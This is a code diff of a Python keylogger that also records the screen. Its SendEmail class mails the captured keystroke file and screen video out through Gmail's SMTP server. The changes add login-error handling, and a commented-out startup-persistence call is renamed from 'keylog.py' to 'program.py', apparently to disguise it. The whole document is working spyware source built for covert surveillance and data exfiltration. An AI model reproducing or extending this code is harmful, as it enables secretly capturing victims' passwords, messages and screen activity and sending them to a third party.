@@ -1,5 +1,3 @@
-# -*- coding: iso8859_2 -*-
-
 import datetime
 import os
 import smtplib
@@ -140,10 +138,13 @@ class SendEmail(Keylogger, ScreenRecord):
                 msg.add_attachment(video_data, maintype='application', subtype='octet-stream', filename=video_name)
                 msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
                 # Send email via SMTP
-                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
-                    smtp.login(self.email_address, self.email_password)
-                    smtp.send_message(msg)
-                    print('SEND')
+                try:
+                    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+                         smtp.login(self.email_address, self.email_password)
+                         smtp.send_message(msg)
+                         print('MESSAGE SEND')
+                except smtplib.SMTPAuthenticationError:
+                    print('Wrong login or password or less secure apps mode is disabled. Please check: https://myaccount.google.com/lesssecureapps')
 
 
 
@@ -180,7 +181,7 @@ if __name__ == '__main__':
 
     k = Keylogger()
     e = SendEmail('YOUR_EMAIL', 'YOUR_PASSWORD', TIME)
-    #s = Startup('keylog.py')
+    #s = Startup('program.py')
     # Make independent threads
     email_thread = threading.Thread(target=e.email)
     header_thread = threading.Thread(target=k.header)
